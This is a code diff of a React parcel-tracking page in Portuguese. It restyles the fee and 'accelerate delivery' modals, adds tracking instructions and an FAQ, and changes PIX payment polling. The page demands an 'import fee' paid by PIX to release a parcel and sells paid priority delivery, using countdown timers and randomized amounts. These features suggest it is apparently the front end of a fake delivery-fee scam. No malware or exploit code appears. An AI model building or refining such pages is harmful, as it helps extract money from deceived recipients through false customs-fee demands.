@@ -19,7 +19,6 @@ const TrackingPage: React.FC = () => {
     const [pixData, setPixData] = useState<any>(null);
     const [pixPaid, setPixPaid] = useState(false);
 
-    // PixGo Tax Integration State
     const [taxPixLoading, setTaxPixLoading] = useState(false);
     const [taxPixData, setTaxPixData] = useState<any>(null);
     const [taxPixPaid, setTaxPixPaid] = useState(false);
@@ -36,31 +35,15 @@ const TrackingPage: React.FC = () => {
             .catch(() => setUseRandomCents(true));
     }, []);
 
+    // Polling de pagamento PIX (Taxa)
     useEffect(() => {
         let interval: any;
-        if (pixData && !pixPaid) {
+        if (showTaxModal && taxPixData && !taxPixPaid) {
             interval = setInterval(async () => {
                 try {
-                    const res = await fetch(`${API_BASE}/api/pix/status/${pixData.payment_id}`);
-                    const json = await res.json();
-                    if (json && json.success && json.data?.status === 'completed') {
-                        setPixPaid(true);
-                        clearInterval(interval);
-                    }
-                } catch (e) { }
-            }, 5000);
-        }
-        return () => clearInterval(interval);
-    }, [pixData, pixPaid]);
-
-    useEffect(() => {
-        let interval: any;
-        if (taxPixData && !taxPixPaid) {
-            interval = setInterval(async () => {
-                try {
-                    const res = await fetch(`${API_BASE}/api/pix/status/${taxPixData.payment_id}`);
-                    const json = await res.json();
-                    if (json && json.success && json.data?.status === 'completed') {
+                    const res = await fetch(`${API_BASE}/api/pix/status/${taxPixData.id || taxPixData.payment_id}?codigo=${trackingData?.codigo || ''}`);
+                    const data = await res.json();
+                    if (data.success && (data.status === 'PAID' || data.status === 'CONFIRMED' || data.data?.status === 'PAID' || data.data?.status === 'completed')) {
                         setTaxPixPaid(true);
                         clearInterval(interval);
                     }
@@ -259,6 +242,43 @@ const TrackingPage: React.FC = () => {
                     .st-code { font-size: 1.5rem !important; margin-top: 8px; }
                 }
 
+                .instruction-card {
+                    background: rgba(255,255,255,0.6);
+                    backdrop-filter: blur(20px);
+                    border: 1px solid rgba(255,255,255,0.8);
+                    border-radius: 24px;
+                    padding: 32px;
+                    margin-top: 40px;
+                    text-align: left;
+                    box-shadow: 0 8px 32px rgba(0, 40, 120, 0.05);
+                }
+                .instruction-step {
+                    display: flex;
+                    gap: 16px;
+                    margin-bottom: 20px;
+                }
+                .step-num {
+                    width: 32px; height: 32px;
+                    background: #0055ff;
+                    color: white;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: 900;
+                    flex-shrink: 0;
+                    box-shadow: 0 4px 12px rgba(0, 85, 255, 0.3);
+                }
+                .faq-grid {
+                    display: grid;
+                    grid-template-columns: repeat(2, 1fr);
+                    gap: 24px;
+                    margin-top: 40px;
+                    text-align: left;
+                }
+                @media (max-width: 600px) {
+                    .faq-grid { grid-template-columns: 1fr; }
+                }
             `}</style>
 
 
@@ -387,9 +407,68 @@ const TrackingPage: React.FC = () => {
                         </div>
                     </div>
                 ) : (
-                    <div style={{ textAlign: 'center', padding: '60px 0', opacity: 0.4 }} className="reveal">
-                        <Package size={80} style={{ marginBottom: '24px', color: 'var(--text-muted)' }} />
-                        <p style={{ color: 'var(--text-secondary)' }}>Digite o seu código para ver a mágica acontecer.</p>
+                    <div className="reveal">
+                        {/* Instruções */}
+                        <div className="instruction-card">
+                            <h3 style={{ fontSize: '1.4rem', fontWeight: 900, marginBottom: '24px', color: 'var(--text-primary)', display: 'flex', alignItems: 'center', gap: '10px' }}>
+                                <Package size={24} color="#0055ff" /> Como rastrear sua encomenda
+                            </h3>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '20px' }}>
+                                <div className="instruction-step">
+                                    <div className="step-num">1</div>
+                                    <div>
+                                        <div style={{ fontWeight: 800, color: 'var(--text-primary)' }}>Pegue seu código</div>
+                                        <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Verifique o e-mail ou SMS enviado no momento da compra.</div>
+                                    </div>
+                                </div>
+                                <div className="instruction-step">
+                                    <div className="step-num">2</div>
+                                    <div>
+                                        <div style={{ fontWeight: 800, color: 'var(--text-primary)' }}>Insira o código</div>
+                                        <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Digite ou cole o rastreio no campo de busca acima.</div>
+                                    </div>
+                                </div>
+                                <div className="instruction-step">
+                                    <div className="step-num">3</div>
+                                    <div>
+                                        <div style={{ fontWeight: 800, color: 'var(--text-primary)' }}>Confirme sua cidade</div>
+                                        <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Alguns rastreios exigem a cidade de destino por segurança.</div>
+                                    </div>
+                                </div>
+                                <div className="instruction-step">
+                                    <div className="step-num">4</div>
+                                    <div>
+                                        <div style={{ fontWeight: 800, color: 'var(--text-primary)' }}>Acompanhe tudo</div>
+                                        <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Veja cada passo da sua encomenda em tempo real.</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        {/* FAQ */}
+                        <div className="faq-grid">
+                            <div style={{ background: 'rgba(255,255,255,0.4)', padding: '24px', borderRadius: '20px', border: '1px solid rgba(255,255,255,0.5)' }}>
+                                <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '0.9rem', marginBottom: '8px' }}>Onde encontro meu código?</div>
+                                <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', lineHeight: 1.6 }}>Geralmente enviado pela loja via E-mail ou WhatsApp após a postagem.</div>
+                            </div>
+                            <div style={{ background: 'rgba(255,255,255,0.4)', padding: '24px', borderRadius: '20px', border: '1px solid rgba(255,255,255,0.5)' }}>
+                                <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '0.9rem', marginBottom: '8px' }}>O que é Taxa Pendente?</div>
+                                <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', lineHeight: 1.6 }}>São tributos ou taxas de processamento que precisam de quitação para liberação do objeto.</div>
+                            </div>
+                            <div style={{ background: 'rgba(255,255,255,0.4)', padding: '24px', borderRadius: '20px', border: '1px solid rgba(255,255,255,0.5)' }}>
+                                <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '0.9rem', marginBottom: '8px' }}>Quanto tempo para entrega?</div>
+                                <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', lineHeight: 1.6 }}>O prazo médio é de 3 a 7 dias úteis após a confirmação no sistema.</div>
+                            </div>
+                            <div style={{ background: 'rgba(255,255,255,0.4)', padding: '24px', borderRadius: '20px', border: '1px solid rgba(255,255,255,0.5)' }}>
+                                <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '0.9rem', marginBottom: '8px' }}>O rastreio não atualiza?</div>
+                                <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', lineHeight: 1.6 }}>Pode levar até 24h úteis para o primeiro registro aparecer após a coleta.</div>
+                            </div>
+                        </div>
+
+                        <div style={{ textAlign: 'center', padding: '60px 0', opacity: 0.6 }}>
+                            <Package size={40} style={{ marginBottom: '16px', color: 'var(--text-muted)' }} />
+                            <p style={{ color: 'var(--text-secondary)', fontWeight: 600 }}>Pronto para começar!</p>
+                        </div>
                     </div>
                 )}
             </div>
@@ -398,16 +477,17 @@ const TrackingPage: React.FC = () => {
 
             {/* Modal Taxa */}
             {showTaxModal && trackingData?.taxa_valor && (
-                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}>
+                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,20,60,0.5)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}>
                     <div style={{
-                        background: 'rgba(20, 20, 25, 0.95)',
-                        border: '1px solid rgba(255,255,255,0.1)',
+                        background: 'rgba(255,255,255,0.95)',
+                        backdropFilter: 'blur(24px)',
+                        border: '1px solid rgba(0,85,255,0.1)',
                         borderRadius: '32px',
                         width: '100%',
                         maxWidth: '440px',
                         maxHeight: '90vh',
                         padding: '40px',
-                        boxShadow: '0 24px 80px rgba(0,0,0,0.5)',
+                        boxShadow: '0 24px 80px rgba(0,40,120,0.15)',
                         animation: 'fadeIn 0.3s ease',
                         textAlign: 'center',
                         overflowY: 'auto',
@@ -415,15 +495,15 @@ const TrackingPage: React.FC = () => {
                     }} onClick={e => e.stopPropagation()}>
                         <button
                             onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}
-                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(255,255,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#888', cursor: 'pointer' }}
+                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(0,85,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#94a3b8', cursor: 'pointer' }}
                         >
                             <X size={18} />
                         </button>
                         <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                             <Calculator size={40} color="#ef4444" />
                         </div>
-                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Pagar Taxa</h2>
-                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
+                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628' }}>Pagar Taxa</h2>
+                        <p style={{ color: '#64748b', lineHeight: 1.6, marginBottom: '32px' }}>
                             Para liberar seu pacote do centro de fiscalização, realize o pagamento da taxa de importação de <strong>R$ {trackingData.taxa_valor}</strong>.
                         </p>
 
@@ -465,15 +545,15 @@ const TrackingPage: React.FC = () => {
                         )}
 
                         {taxPixData && !taxPixPaid && (
-                            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
+                            <div style={{ background: 'rgba(239,68,68,0.04)', border: '1px solid rgba(239,68,68,0.1)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                 <div style={{ fontSize: '0.8rem', color: '#ef4444', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pix Copia e Cola</div>
-                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
+                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#0a1628', marginBottom: '16px' }}>
                                     R$ {taxPixData.amount ? taxPixData.amount.toFixed(2).replace('.', ',') : trackingData.taxa_valor}
                                 </div>
                                 <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                     <img src={taxPixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                 </div>
-                                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
+                                <div style={{ background: 'rgba(239,68,68,0.04)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: '#64748b', marginBottom: '10px', userSelect: 'all', border: '1px solid rgba(239,68,68,0.08)' }}>
                                     {taxPixData.qr_code}
                                 </div>
                                 {timeLeft !== null && (
@@ -481,7 +561,7 @@ const TrackingPage: React.FC = () => {
                                         🕒 Expira em: {formatTime(timeLeft)}
                                     </div>
                                 )}
-                                <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
+                                <p style={{ fontSize: '0.85rem', color: '#94a3b8', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                 <button
                                     onClick={() => {
                                         navigator.clipboard.writeText(taxPixData.qr_code);
@@ -520,13 +600,13 @@ const TrackingPage: React.FC = () => {
                             <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                 <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                 <div style={{ fontSize: '1.2rem', color: '#10b981', fontWeight: 800 }}>Pagamento Confirmado!</div>
-                                <p style={{ fontSize: '0.9rem', color: 'rgba(255,255,255,0.7)', marginTop: '8px' }}>Sua taxa foi paga com sucesso. O pacote será liberado em breve.</p>
+                                <p style={{ fontSize: '0.9rem', color: '#64748b', marginTop: '8px' }}>Sua taxa foi paga com sucesso. O pacote será liberado em breve.</p>
                             </div>
                         )}
 
                         {/* FAQ SECTION */}
-                        <div style={{ textAlign: 'left', marginTop: '40px', borderTop: '1px solid rgba(255,255,255,0.1)', paddingTop: '32px' }}>
-                            <h3 style={{ fontSize: '1.1rem', fontWeight: 800, marginBottom: '20px', color: '#fff', display: 'flex', alignItems: 'center', gap: '10px' }}>
+                        <div style={{ textAlign: 'left', marginTop: '40px', borderTop: '1px solid rgba(0,85,255,0.08)', paddingTop: '32px' }}>
+                            <h3 style={{ fontSize: '1.1rem', fontWeight: 800, marginBottom: '20px', color: '#0a1628', display: 'flex', alignItems: 'center', gap: '10px' }}>
                                 <Package size={20} color="#ef4444" /> Informações Importantes
                             </h3>
 
@@ -550,23 +630,24 @@ const TrackingPage: React.FC = () => {
                             </div>
                         </div>
 
-                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '32px', cursor: 'pointer', fontWeight: 600, fontSize: '0.9rem', textDecoration: 'underline' }}>{taxPixPaid ? 'Fechar' : 'Voltar para o rastreio'}</button>
+                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }} style={{ background: 'none', border: 'none', color: '#94a3b8', marginTop: '32px', cursor: 'pointer', fontWeight: 600, fontSize: '0.9rem', textDecoration: 'underline' }}>{taxPixPaid ? 'Fechar' : 'Voltar para o rastreio'}</button>
                     </div>
                 </div>
             )}
 
             {/* Modal Acelerar */}
             {showExpressModal && (
-                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}>
+                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,20,60,0.5)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}>
                     <div style={{
-                        background: 'rgba(20, 20, 25, 0.95)',
-                        border: '1px solid rgba(255,255,255,0.1)',
+                        background: 'rgba(255,255,255,0.95)',
+                        backdropFilter: 'blur(24px)',
+                        border: '1px solid rgba(0,85,255,0.1)',
                         borderRadius: '32px',
                         width: '100%',
                         maxWidth: '440px',
                         maxHeight: '90vh',
                         padding: '40px',
-                        boxShadow: '0 24px 80px rgba(0,0,0,0.5)',
+                        boxShadow: '0 24px 80px rgba(0,40,120,0.15)',
                         animation: 'fadeIn 0.3s ease',
                         textAlign: 'center',
                         overflowY: 'auto',
@@ -574,15 +655,15 @@ const TrackingPage: React.FC = () => {
                     }} onClick={e => e.stopPropagation()}>
                         <button
                             onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}
-                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(255,255,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#888', cursor: 'pointer' }}
+                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(0,85,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#94a3b8', cursor: 'pointer' }}
                         >
                             <X size={18} />
                         </button>
                         <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                             <Truck size={40} color="#0055ff" />
                         </div>
-                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Acelerar Entrega</h2>
-                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
+                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628' }}>Acelerar Entrega</h2>
+                        <p style={{ color: '#64748b', lineHeight: 1.6, marginBottom: '32px' }}>
                             Ao acelerar, seu pacote ganha prioridade máxima em nossa malha e será entregue em até <strong>3 dias úteis</strong>.
                         </p>
 
